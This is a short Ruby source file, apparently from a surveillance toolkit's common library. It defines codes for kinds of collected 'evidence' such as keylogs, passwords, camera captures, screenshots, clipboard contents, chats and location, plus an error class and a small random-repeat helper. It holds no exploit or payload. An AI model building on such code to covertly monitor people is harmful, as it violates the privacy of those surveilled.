
require 'ffi'
require 'rcs-common/utf16le'

module RCS

EVIDENCE_TYPES = { 0x0240 => :DEVICE,
                   0x0140 => :CALL,
                   0x0241 => :INFO,
                   0xB9B9 => :SNAPSHOT,
                   0x0040 => :KEYLOG,
                   0xE9E9 => :CAMERA,
                   0xC6C6 => :CHAT,
                   0x0300 => :CHATSKYPE,
                   0x0280 => :MOUSE,
                   0x0100 => :PRINT,
                   0x0180 => :URL,
                   0x0181 => :URLCAPTURE,
                   0xD9D9 => :CLIPBOARD,
                   0xFAFA => :PASSWORD,
                   0x0000 => :FILEOPEN,
                   0x0001 => :FILECAP,
                   0x1011 => :APPLICATION,
                   0xD0D0 => :DOWNLOAD,
                   0x1220 => :LOCATION}

class EvidenceDeserializeError < StandardError
  attr_reader :msg

  def initialize(msg)
    @msg = msg
  end

  def to_s
    @msg
  end
end

end # RCS::

class Integer
  def rand_times(&block)
    (rand(self-1)+1).times { yield }
  end
end
